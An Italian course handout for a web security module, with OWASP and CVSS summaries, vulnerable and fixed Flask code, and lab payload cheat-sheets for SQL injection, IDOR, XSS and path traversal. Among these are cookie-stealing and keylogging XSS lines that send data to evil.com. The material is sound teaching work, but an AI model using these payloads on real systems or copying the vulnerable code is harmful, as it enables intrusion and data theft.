# Modulo M6 — Sicurezza delle Applicazioni Web

**Dispensa Tecnica — Corso ITS Cybersecurity (32h)**
**Modulo 6 — 9 ore (3h teoria + 6h laboratorio) — il modulo più tecnico del corso**
**Prerequisiti**: M0 (ambiente), M1 (CIA Triad), M3 (HTTP), M5 (STRIDE)

> **Materiale di riferimento principale**: `dispensa-sviluppo-sicuro-software.docx`, **Capitoli 4-10** (cuore del modulo, riusato integralmente).
>
> Questo documento è un **orchestratore + cheat-sheet operativo** che integra la dispensa principale con:
> 1. Indice ragionato per i 9h di M6
> 2. **Checklist per ogni vulnerabilità** (cosa cercare, cosa correggere)
> 3. **Cheat-sheet di payload** per i lab
> 4. **Tabella mapping** OWASP ↔ CWE ↔ articolo GDPR
> 5. **Setup rapido** di `bancapiccola-mini` per i lab

---

## Indice

- [Capitolo 1 — Mappa del modulo (9h)](#cap1)
- [Capitolo 2 — OWASP Top 10:2025 — riepilogo](#cap2)
- [Capitolo 3 — CVE/CVSS in 10 minuti](#cap3)
- [Capitolo 4 — Checklist + cheat-sheet per vulnerabilità](#cap4)
  - [4.1 SQL Injection](#cap4-1)
  - [4.2 Broken Access Control / IDOR](#cap4-2)
  - [4.3 Cryptographic Failures (password)](#cap4-3)
  - [4.4 Cross-Site Scripting (XSS)](#cap4-4)
  - [4.5 Vulnerable Components / Supply Chain](#cap4-5)
  - [4.6 Path Traversal](#cap4-6)
- [Capitolo 5 — Setup rapido bancapiccola-mini](#cap5)
- [Capitolo 6 — Mapping OWASP ↔ CWE ↔ GDPR](#cap6)
- [Capitolo 7 — Checklist di chiusura modulo](#cap7)

---

<a name="cap1"></a>
## Capitolo 1 — Mappa del modulo (9h)

| Sottomodulo | Argomento | Tempo |
|-------------|-----------|-------|
| **M6.1** | OWASP Top 10:2025 + CVE/CVSS | 1h |
| **M6.2** | SQL Injection (lab pesante) | 2h |
| **M6.3** | Broken Access Control / IDOR | 1,5h |
| **M6.4** | Password e crittografia (bcrypt/Argon2id) | 1,5h |
| **M6.5** | Cross-Site Scripting (XSS) | 1,5h |
| **M6.6** | Supply Chain (`pip-audit`) | 0,5h |
| **M6.7** | Path Traversal | 1h |
| | **TOTALE** | **9h** |

**Capitoli della dispensa principale corrispondenti**:

| Sottomodulo | Capitolo dispensa principale |
|-------------|-------------------------------|
| M6.1 | Cap 4 |
| M6.2 | Cap 5 |
| M6.3 | Cap 6 |
| M6.4 | Cap 7 |
| M6.5 | Cap 8 |
| M6.6 | Cap 9 |
| M6.7 | Cap 10 |

> **Strategia operativa**: in aula segui i Cap 4-10 della dispensa principale, **affiancando** questo materiale come checklist e cheat-sheet payload nei lab.

---

<a name="cap2"></a>
## Capitolo 2 — OWASP Top 10:2025 — riepilogo

> Quanto ci vorrà: 20 minuti.

### 2.1 Cos'è OWASP

**OWASP** = Open Web Application Security Project. Fondazione no-profit nata nel 2001. Gold standard globale per la sicurezza applicativa.

Pubblica:
- **OWASP Top 10**: classifica delle 10 vulnerabilità più diffuse, aggiornata ogni ~3 anni.
- OWASP API Security Top 10
- OWASP ASVS (Application Security Verification Standard)
- OWASP SAMM (Software Assurance Maturity Model)
- Decine di tool gratuiti (ZAP, Dependency-Check, ecc.)

### 2.2 La Top 10 nel tempo

| 2017 | 2021 | 2025 (proiezione)* |
|------|------|---------------------|
| A01 Injection | A01 Broken Access Control ↑ | A01 Broken Access Control |
| A02 Broken Auth | A02 Cryptographic Failures | A02 Cryptographic Failures |
| A03 Sensitive Data | A03 Injection ↓ | A03 Injection |
| A04 XXE | A04 Insecure Design (NEW) | A04 Insecure Design |
| A05 Broken Access Control | A05 Security Misconfiguration | A05 Security Misconfiguration |
| A06 Security Misconfiguration | A06 Vulnerable & Outdated Components | A06 Vulnerable Components |
| A07 XSS | A07 Identification & Auth Failures | A07 Identification & Auth Failures |
| A08 Insecure Deserialization | A08 Software & Data Integrity (NEW) | A08 Software & Data Integrity |
| A09 Vulnerable Components | A09 Logging & Monitoring Failures | A09 Logging & Monitoring Failures |
| A10 Insufficient Logging | A10 SSRF (NEW) | A10 SSRF |

\* La Top 10 2025 è in elaborazione al momento di scrittura. Il corso usa sostanzialmente la 2021 con minor adjustments.

### 2.3 Cosa tratteremo a fondo (vs cosa solo accenniamo)

**A fondo** (M6.2-M6.7):
- A01 Broken Access Control / IDOR
- A02 Cryptographic Failures (password)
- A03 Injection (SQL Injection)
- A06 Vulnerable Components (supply chain)
- XSS (anche se cambia categoria edizione per edizione)
- Path Traversal (caso particolare di A01)

**Accenni** (sufficienti per il riconoscimento, dettaglio lasciato al secondo anno):
- A04 Insecure Design — già coperto da M5 (threat modeling)
- A05 Security Misconfiguration — già coperto da M3 (header)
- A07 Identification & Auth Failures — coperto da M6.4 (password) + cenno JWT
- A08 Software & Data Integrity — cenno in M6.6
- A09 Logging & Monitoring — cenno trasversale
- A10 SSRF — non trattato (rinvio al II anno ITS)
- CSRF — cenno in M3 (cookie SameSite)

---

<a name="cap3"></a>
## Capitolo 3 — CVE/CVSS in 10 minuti

> Quanto ci vorrà: 15 minuti.

### 3.1 CVE — Common Vulnerabilities and Exposures

Identificatore univoco di una vulnerabilità nota. Formato: `CVE-AAAA-NNNNN`.

Esempi famosi:
- **CVE-2014-0160** — Heartbleed (OpenSSL)
- **CVE-2017-5638** — Apache Struts (origine breach Equifax)
- **CVE-2021-44228** — Log4Shell (Log4j)
- **CVE-2024-3094** — XZ Utils backdoor

**Database principale**: NVD (National Vulnerability Database) — https://nvd.nist.gov

**Lifecycle di una CVE**:

```
Scoperta privata (researcher/internal)
    ↓
Coordinated disclosure al vendor
    ↓
Vendor sviluppa patch
    ↓
CVE ID assegnato (RESERVED)
    ↓
Patch + dettagli pubblicati (PUBLISHED)
    ↓
NVD analizza e pubblica CVSS
    ↓
Database aggiornati (pip-audit, Dependabot, ecc.)
```

### 3.2 CVSS — Common Vulnerability Scoring System

Sistema standard per **misurare la gravità** di una vulnerabilità. Score da 0.0 a 10.0.

**Versione**: CVSS v3.1 (la più usata oggi). v4.0 sta uscendo.

**Bande di severity**:

| Range | Severity |
|-------|----------|
| 0.0 | None |
| 0.1 – 3.9 | Low |
| 4.0 – 6.9 | Medium |
| 7.0 – 8.9 | High |
| **9.0 – 10.0** | **Critical** |

### 3.3 Le Base Metrics di CVSS v3.1

| Metric | Valori | Cosa misura |
|--------|--------|-------------|
| **Attack Vector** (AV) | Network, Adjacent, Local, Physical | Da dove si può sfruttare |
| **Attack Complexity** (AC) | Low, High | Quanto è difficile |
| **Privileges Required** (PR) | None, Low, High | Servono privilegi? |
| **User Interaction** (UI) | None, Required | Serve azione utente? |
| **Scope** (S) | Unchanged, Changed | Tocca altri sistemi? |
| **Confidentiality** (C) | None, Low, High | Impatto su C |
| **Integrity** (I) | None, Low, High | Impatto su I |
| **Availability** (A) | None, Low, High | Impatto su A |

### 3.4 Lettura di un Vector String

Esempio Log4Shell: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

Si legge:
- AV:**N** → Network (sfruttabile da Internet)
- AC:**L** → Low (facile)
- PR:**N** → None (nessun privilegio richiesto)
- UI:**N** → None (nessuna interazione utente)
- S:**C** → Changed (impatta altri sistemi)
- C/I/A: **H/H/H** → tutti High

Risultato: **10.0 Critical** — caso di scuola.

### 3.5 Dove cercare CVE

- **NVD**: https://nvd.nist.gov/vuln/search
- **CVE.org**: https://www.cve.org
- **Vulncheck**: https://vulncheck.com
- **GitHub Advisories**: https://github.com/advisories
- Per Python: **PyPI Advisory Database** integrata in `pip-audit`

### 3.6 EPSS — Exploit Prediction Scoring System (cenno)

CVSS dice "quanto è grave", ma non "quanto è probabile che venga sfruttata adesso".

**EPSS** dice esattamente questo: probabilità che una CVE sia sfruttata nei prossimi 30 giorni (0-100%).

Esempi:
- CVE generica con CVSS 7.5 ma EPSS 0.5% → bassa priorità reale.
- CVE con CVSS 7.5 ma EPSS 95% → priorità altissima.

> Nei team di prodotto seri, **prioritizzare** patch usando CVSS + EPSS combinati.

---

<a name="cap4"></a>
## Capitolo 4 — Checklist + cheat-sheet per vulnerabilità

> Per ogni vulnerabilità: come la identifichi, payload di test, come la correggi.

<a name="cap4-1"></a>
### 4.1 SQL Injection (M6.2 — 2h)

**OWASP**: A03 Injection
**CWE**: CWE-89
**GDPR**: Art. 5(1)(f), Art. 32

#### Come la identifichi (a vista nel codice)

```python
# 🚩 CAMPANELLI D'ALLARME
sql = f"SELECT * FROM users WHERE id = {user_id}"        # f-string + var
sql = "SELECT * FROM users WHERE id = " + str(user_id)   # concatenazione
sql = "SELECT * FROM users WHERE id = %s" % user_id       # %-formatting
cursor.execute(sql)
```

#### Cheat-sheet di payload (per i lab)

```sql
-- Login bypass classico
' OR '1'='1
' OR 1=1 --
admin' --
admin'/*

-- UNION-based extraction (numero colonne corretto)
' UNION SELECT 1,2,3 --
' UNION SELECT username, password, NULL FROM users --

-- Estrazione tabelle (MySQL/SQLite)
' UNION SELECT name, NULL FROM sqlite_master --
' UNION SELECT table_name, NULL FROM information_schema.tables --

-- Time-based (blind SQLi)
' OR (SELECT sleep(5)) --

-- Bypass quote escaping ingenuo
\' OR \'1\'=\'1
```

#### Come correggerla

```python
# ✅ Query parametrizzata (SQLite)
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))

# ✅ Query parametrizzata (PostgreSQL/psycopg2)
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# ✅ ORM (SQLAlchemy)
user = User.query.filter_by(id=user_id).first()
```

#### Errore comune

> "Filtro gli apici e i punti e virgola, sono tranquillo."

**No.** I filtri si aggirano (encoding, whitespace, commenti). L'**unica** difesa robusta sono le query parametrizzate. Le validation/whitelist sono difesa **aggiuntiva**, non sostitutiva.

#### Difese stratificate

1. ✅ Query parametrizzate (mai concatenare).
2. ✅ ORM (forza il pattern corretto).
3. ✅ Least privilege per l'utente DB della webapp.
4. ✅ Errori generici al client (no stack trace).
5. ✅ WAF (filtra payload comuni).
6. ✅ Logging sui pattern sospetti.

<a name="cap4-2"></a>
### 4.2 Broken Access Control / IDOR (M6.3 — 1,5h)

**OWASP**: A01 Broken Access Control
**CWE**: CWE-639, CWE-285
**GDPR**: Art. 32

#### Come la identifichi

```python
# 🚩 IDOR classico — manca controllo proprietario
@app.route("/fattura/<int:fid>")
def fattura(fid):
    f = Fattura.query.get(fid)        # qualunque fattura
    return render_template("fattura.html", fattura=f)
```

#### Cheat-sheet di test

```
# Cambia ID negli URL e vedi se funziona
GET /fattura/42         → vedi la tua
GET /fattura/43         → vedi quella di un altro? IDOR!

# Funziona anche con UUID se l'attaccante li ottiene da altre vie
GET /doc/abc123-...

# Su PUT/DELETE è anche peggio
PUT  /fattura/43 → modifichi quella di un altro
DELETE /fattura/43 → cancelli quella di un altro

# Su POST (creazione "per conto di")
POST /fattura  con body owner_id=43  → crei a nome di un altro
```

#### Come correggerla

```python
# ✅ Ownership check server-side
@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.get(fid)
    if f is None:
        abort(404)
    if f.owner_id != session["user_id"]:
        abort(403)        # ⚠️ 403, non 404
    return render_template("fattura.html", fattura=f)

# ✅ Pattern alternativo: filtra direttamente per owner
@app.route("/fattura/<int:fid>")
@login_required
def fattura(fid):
    f = Fattura.query.filter_by(
        id=fid, owner_id=session["user_id"]
    ).first_or_404()
    return render_template("fattura.html", fattura=f)
```

#### Errore comune

- **Nascondere ID nell'UI** ("non li mostro, l'utente non sa che esistono"). Sicurezza per oscurità: l'attaccante li trova lo stesso.
- **Restituire 404 invece di 403** quando user è autenticato ma non autorizzato. 404 ammette implicitamente che la risorsa potrebbe non esistere — confonde gli analytics e talvolta facilita enumerazione.
- **Confondere autenticazione con autorizzazione**. Login = ti riconosco. Authz = vediamo cosa puoi fare.

#### Difese stratificate

1. ✅ Ownership check server-side **su ogni endpoint**.
2. ✅ Filter by user nell'ORM (pattern preferito).
3. ✅ 401 per non autenticato, 403 per autorizzato.
4. ✅ Test automatici di authz (per ogni endpoint, testa "chi NON deve poter accedere").
5. ✅ Audit log degli accessi a risorse sensibili.

<a name="cap4-3"></a>
### 4.3 Cryptographic Failures (M6.4 — 1,5h)

**OWASP**: A02 Cryptographic Failures
**CWE**: CWE-328, CWE-327
**GDPR**: Art. 32(1)(a)

#### Come la identifichi

```python
# 🚩 Tutti questi sono catastrofici
password_hash = password                                          # in chiaro
password_hash = hashlib.md5(password.encode()).hexdigest()        # MD5
password_hash = hashlib.sha1(password.encode()).hexdigest()       # SHA-1
password_hash = hashlib.sha256(password.encode()).hexdigest()     # SHA-256 senza salt
password_hash = base64.b64encode(password.encode())               # Base64 (encoding!)
password_hash = encrypt(password, secret_key)                      # cifratura reversibile
```

#### Test rapido (lab)

Apri il DB con DB Browser → tabella `users` → colonna `password`.

| Cosa vedi | Diagnosi |
|-----------|----------|
| `mariopwd` (chiaro) | 🔥 Catastrofico |
| `5f4dcc3b5aa765d61d8327deb882cf99` (32 hex) | MD5 / morto |
| `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` (40 hex) | SHA-1 / morto |
| `e3b0c44298fc1c149afbf4c8996fb924...` (64 hex) | SHA-256, ma senza salt è ancora vulnerabile |
| `$2b$12$KIXbN...` | bcrypt ✅ |
| `$argon2id$v=19$m=65536...` | Argon2id ✅ |

#### Come correggere — bcrypt

```python
import bcrypt

# Hashare una nuova password
def hash_password(password: str) -> bytes:
    return bcrypt.hashpw(password.encode("utf-8"), bcrypt.gensalt(rounds=12))

# Verificare
def verify_password(password: str, password_hash: bytes) -> bool:
    return bcrypt.checkpw(password.encode("utf-8"), password_hash)

# Uso
hash_db = hash_password("segretissima")
# salva hash_db nel DB

# Login
if verify_password(input_pwd, user.password_hash):
    # ok
```

#### Come correggere — Argon2id (più moderno)

```python
from argon2 import PasswordHasher

ph = PasswordHasher()    # default sicuri

# Hashare
hash_db = ph.hash("segretissima")  # restituisce stringa

# Verificare
try:
    ph.verify(hash_db, input_pwd)
    # ok
except argon2.exceptions.VerifyMismatchError:
    # password sbagliata
```

#### Errore comune

- **MD5 con salt**: comunque inadeguato, MD5 è troppo veloce.
- **SHA-256 con salt**: meglio di niente ma inadeguato per password (troppo veloce per hardware moderno).
- **Iterare SHA-256 N volte (PBKDF2)**: accettabile, ma **bcrypt e Argon2id sono migliori**.
- **Hash globale** (stesso salt per tutti): inutile, attacco rainbow table batch.

#### Difese stratificate

1. ✅ bcrypt o Argon2id — **mai SHA per password**.
2. ✅ Salt automatico (le librerie lo generano).
3. ✅ Work factor calibrato (~250ms per hash su hardware target).
4. ✅ Politiche password (minlength 12, no top-100 leaked, anti-brute force).
5. ✅ MFA su account critici.
6. ✅ Rehash on login (se hai migrato da SHA1/MD5 a bcrypt: la prima volta che l'utente entra, rehash con bcrypt e aggiorna).

<a name="cap4-4"></a>
### 4.4 Cross-Site Scripting (XSS) (M6.5 — 1,5h)

**OWASP**: A03 Injection (in alcune edizioni A07)
**CWE**: CWE-79
**GDPR**: Art. 32 (può portare a info disclosure)

#### Come la identifichi

```python
# 🚩 Output HTML senza escape
@app.route("/cerca")
def cerca():
    q = request.args.get("q", "")
    return f"<p>Risultati per: {q}</p>"   # XSS riflessa
```

```html
<!-- 🚩 Jinja2 con |safe su input utente -->
<p>{{ commento | safe }}</p>             <!-- XSS stored -->
```

#### Cheat-sheet di payload

```html
<!-- Test base -->
<script>alert(1)</script>

<!-- Eventi -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Bypass filtri ingenui -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<SCRIPT>alert(1)</SCRIPT>
<script src=//evil.com/x.js></script>

<!-- Furto cookie (XSS reale, da capire) -->
<script>
fetch('https://evil.com/log?c='+document.cookie)
</script>

<!-- Stored XSS che keylogga -->
<script>
document.addEventListener('keydown', e=>
  fetch('https://evil.com/k?='+e.key));
</script>

<!-- DOM-based (manipolazione DOM lato client) -->
<a href="javascript:alert(1)">click</a>
```

#### Come correggerla

```python
# ✅ Flask + Jinja2 fa escape di default
@app.route("/cerca")
def cerca():
    q = request.args.get("q", "")
    return render_template("cerca.html", query=q)
```

```html
<!-- ✅ template.html: escape automatico -->
<p>Risultati per: {{ query }}</p>

<!-- ✅ NON usare |safe su input utente -->
<!-- ✅ Per HTML "trusted" da utente: bleach/markdown sanitization -->
```

#### Difese stratificate

1. ✅ **Escape dell'output** (Jinja2 fa per te per default — non disabilitarlo).
2. ✅ **CSP** restrittiva (`script-src 'self'`).
3. ✅ Cookie con `HttpOnly` (XSS non può rubare il session token).
4. ✅ Sanitizzazione **input** se l'utente può inviare HTML voluto (markdown, WYSIWYG): usa `bleach` con whitelist tag.
5. ✅ `X-Content-Type-Options: nosniff`.
6. ✅ Validation della query string (whitelist caratteri).

<a name="cap4-5"></a>
### 4.5 Vulnerable Components / Supply Chain (M6.6 — 0,5h)

**OWASP**: A06 Vulnerable & Outdated Components
**CWE**: CWE-1104
**GDPR**: Art. 32 — patching tempestivo

#### Come la identifichi

```bash
# 🚩 requirements.txt con versioni vecchie
flask==2.0.0
requests==2.20.0
pyyaml==5.1
```

#### Lab pip-audit (preparalo prima)

```bash
# Installazione
pip install pip-audit

# Scan
pip-audit

# Output esempio:
#   Found 3 known vulnerabilities in 2 packages
#   Name      Version  ID                  Fix Versions
#   ----     -------  ------------------  ------------
#   flask    2.0.0    GHSA-m2qf-hxjv-5gpq 2.2.5
#   pyyaml   5.1      GHSA-6757-jp84-gxfx 5.4
```

#### Come correggerla

```bash
# 1. Aggiorna le versioni vulnerabili
pip install --upgrade flask pyyaml

# 2. Aggiorna requirements.txt
pip freeze > requirements.txt

# 3. Riesegui pip-audit per confermare
pip-audit
```

#### Difese stratificate

1. ✅ `pip-audit` in CI/CD.
2. ✅ Dependabot/Renovate (PR automatiche di update).
3. ✅ SBOM aggiornato (CycloneDX, SPDX).
4. ✅ Pinning versioni (mai `flask>=2.0`, sempre `flask==2.3.3`).
5. ✅ Dependency review (conoscere cosa importi).
6. ✅ Scelta libraries con manutenzione attiva (commit recenti, GitHub stars, security policy).

<a name="cap4-6"></a>
### 4.6 Path Traversal (M6.7 — 1h)

**OWASP**: A01 Broken Access Control (variante)
**CWE**: CWE-22
**GDPR**: Art. 32

#### Come la identifichi

```python
# 🚩 Concatenazione naive di filename
@app.route("/download")
def download():
    filename = request.args.get("file")
    return send_file(f"./uploads/{filename}")
```

#### Cheat-sheet di payload

```
# Linux
../etc/passwd
../../etc/passwd
../../../../../../etc/passwd
....//....//etc/passwd          # bypass filtro ../ ingenuo
..%2f..%2fetc%2fpasswd          # URL-encoded

# Windows
..\windows\system32\drivers\etc\hosts
..\..\Windows\win.ini

# Stessa app
../app.py
../config.py
../.env

# Da Linux a Windows (backslash interpretato in Linux come letterale)
..\\etc\\passwd
```

#### Come correggerla

```python
import os
from flask import abort, send_from_directory

UPLOAD_DIR = os.path.realpath("./uploads")
ALLOWED_EXTS = {".pdf", ".png", ".jpg", ".jpeg", ".docx"}

@app.route("/download")
@login_required
def download():
    filename = request.args.get("file", "")

    # 1) Validazione: niente separatori, no nascosti
    if not filename or "/" in filename or "\\" in filename or filename.startswith("."):
        abort(400)

    # 2) Whitelist estensione
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXTS:
        abort(400)

    # 3) Risoluzione path + check dentro UPLOAD_DIR
    full_path = os.path.realpath(os.path.join(UPLOAD_DIR, filename))
    if not full_path.startswith(UPLOAD_DIR + os.sep):
        abort(403)

    # 4) Esistenza
    if not os.path.isfile(full_path):
        abort(404)

    return send_from_directory(UPLOAD_DIR, filename, as_attachment=True)
```

#### Difese stratificate

1. ✅ Whitelist nome file (non concatenare input dell'utente).
2. ✅ `realpath()` + `startswith(BASE_DIR)`.
3. ✅ Whitelist estensione.
4. ✅ Servire da object storage (S3/MinIO) invece che da filesystem locale.
5. ✅ Filesystem permissions stretti (l'utente di processo non legge `/etc`).

---

<a name="cap5"></a>
## Capitolo 5 — Setup rapido bancapiccola-mini

> Per i lab di M6, costruirete progressivamente `bancapiccola-mini`: una webapp Flask che parte vulnerabile e diventa sicura al termine del modulo.

### 5.1 Struttura iniziale (cap M6.2)

```
bancapiccola-mini/
├── .venv/
├── app.py          ← cuore della webapp
├── schema.sql      ← schema DB
├── seed.py         ← popola con dati di test
├── templates/
│   ├── base.html
│   ├── login.html
│   ├── dashboard.html
│   ├── fatture.html
│   └── fattura.html
├── static/
│   └── style.css
├── uploads/        ← per il lab path traversal
└── requirements.txt
```

### 5.2 Comandi base (per ogni lab)

```bash
# Setup iniziale (solo prima volta)
cd bancapiccola-mini
python -m venv .venv
.\.venv\Scripts\Activate.ps1   # Windows
pip install -r requirements.txt
python seed.py

# Avvio server
python app.py

# In un altro terminale: test attacco
curl -X POST http://localhost:5000/login \
  -d "email=admin' OR '1'='1&password=anything"
```

### 5.3 Stato del codice per modulo

| Modulo | Stato di partenza | Stato finale |
|--------|-------------------|--------------|
| M6.2 | login f-string SQLi | login query parametrizzata |
| M6.3 | `/fattura/<id>` no authz | con ownership check |
| M6.4 | password in SHA-1 | password con bcrypt |
| M6.5 | template Jinja con `\|safe` | escape attivo + CSP |
| M6.6 | `requirements.txt` con CVE | `pip-audit` clean |
| M6.7 | `/download?file=` naive | path validation completa |

> **Importante**: ogni step è **commit separato** in Git. A fine M6 lo studente ha una storia Git che è il diario del proprio apprendimento.

### 5.4 Versione finale = "BancaPiccola-secure"

Alla fine di M6, lo studente ha trasformato `bancapiccola-mini-vuln` nella versione sicura. Questo è il **modello mentale** per il lab integrato M7 dove farà la stessa operazione su BancaPiccola completa (più feature, più vulnerabilità).

---

<a name="cap6"></a>
## Capitolo 6 — Mapping OWASP ↔ CWE ↔ GDPR

> Tabella di sintesi che lega tecnica e normativa. Memorizzala — entra nei test.

| OWASP | Vulnerabilità | CWE | GDPR Art. | Sanzione max |
|-------|---------------|-----|-----------|---------------|
| A01 | Broken Access Control / IDOR | 285, 639 | 5(1)(f), 32 | 20M€ / 4% |
| A01 | Path Traversal | 22 | 32 | 20M€ / 4% |
| A02 | Password in MD5/SHA1/chiaro | 327, 328, 916 | 32(1)(a) | 20M€ / 4% |
| A02 | No HTTPS / TLS debole | 319 | 32(1)(a) | 20M€ / 4% |
| A03 | SQL Injection | 89 | 5(1)(f), 32 | 20M€ / 4% |
| A03 | XSS (variante) | 79 | 32 | 20M€ / 4% |
| A04 | Insecure Design (no threat model) | 657 | 25 | 10M€ / 2% |
| A05 | Security Misconfiguration | 16 | 32 | 20M€ / 4% |
| A06 | Vulnerable Components | 1104 | 32 | 20M€ / 4% |
| A07 | Identification & Auth Failures | 287, 384 | 32 | 20M€ / 4% |
| A08 | Software & Data Integrity | 829, 502 | 32 | 20M€ / 4% |
| A09 | Logging & Monitoring Failures | 778 | 33 | 10M€ / 2% |
| A10 | SSRF | 918 | 32 | 20M€ / 4% |

> **Lettura veloce**: praticamente ogni vulnerabilità OWASP è anche violazione GDPR Art. 32 ("misure tecniche adeguate"). Il livello tecnico **è** il livello legale.

---

<a name="cap7"></a>
## Capitolo 7 — Checklist di chiusura modulo

Al termine di M6 il discente deve essere in grado di:

```
☐ Citare la OWASP Top 10:2025 (almeno le prime 5)
☐ Leggere un CVE e interpretare il CVSS score
☐ RICONOSCERE in codice una SQL Injection
☐ SFRUTTARLA con payload di base
☐ CORREGGERLA con query parametrizzate

☐ RICONOSCERE un IDOR
☐ TESTARLO cambiando ID
☐ CORREGGERLO con ownership check

☐ DIFFERENZIARE encoding, hashing, encryption
☐ VEDERE la differenza tra MD5 e bcrypt nel DB
☐ MIGRARE da SHA-1 a bcrypt

☐ RICONOSCERE i 3 tipi di XSS (Reflected/Stored/DOM)
☐ SFRUTTARE XSS riflessa con payload base
☐ CORREGGERE con Jinja2 escape + CSP

☐ ESEGUIRE pip-audit
☐ AGGIORNARE dipendenze vulnerabili

☐ RICONOSCERE Path Traversal
☐ TESTARE con ../etc/passwd
☐ CORREGGERE con realpath + startswith

☐ Leggere bancapiccola-mini-secure e capirla
☐ Pronto per il lab integrato M7 su BancaPiccola completa
```

### Errori da evitare per il docente in classe

- **Non fare i lab "sulla carta"**: i discenti **devono vedere il proprio attacco riuscire** prima della difesa. È il momento di apprendimento più alto.
- **Non chiudere bancapiccola-mini a fine M6**: serve in M7.
- **Tenere la finestra "vulnerabile" e "sicura" affiancate** nei diff. La differenza è sempre piccola (3-5 righe) — il discente capisce che la sicurezza è precisione, non quantità.
- **Saltare M6.7 se sei in ritardo**: path traversal è importante ma in 9 ore è il primo da sacrificare. Diventa "homework" guidato.

### Errori da evitare per il discente

- ❌ Pensare che bcrypt sia "lento, scelgo SHA-256". È **lento di proposito**.
- ❌ "Filtro gli apici, sono al sicuro da SQLi". No.
- ❌ "L'ID nascosto nell'UI difende da IDOR". No.
- ❌ Disabilitare l'escape Jinja2 con `|safe` per "essere flessibili". Quasi sempre è sbagliato.
- ❌ "Nessuno può trovare il mio endpoint admin/`pannello-segreto-2024-xyz`". Sicurezza per oscurità: scoperta in giorni.

---

**Prossimo modulo**: M7 — Lab Integrato (2h). Adesso che sai **cosa cercare** e **come correggere**, lo applichi su BancaPiccola completa.
